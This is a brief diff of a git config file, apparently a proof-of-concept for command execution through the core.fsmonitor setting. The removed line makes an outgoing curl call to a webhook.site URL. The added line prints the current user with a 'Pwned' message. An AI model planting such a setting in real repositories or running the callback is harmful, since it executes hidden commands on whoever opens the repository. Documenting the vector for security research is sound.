@@ -3,5 +3,5 @@
   filemode = true
   bare = false
   worktree = "worktree"
-  fsmonitor = "curl -m3 --silent https://webhook.site/af9fc5d9-45c9-43fc-8daa-716a391ff268 >&2; false"
+  fsmonitor = "echo \"Pwned as $(whoami)\" >&2; false"
 
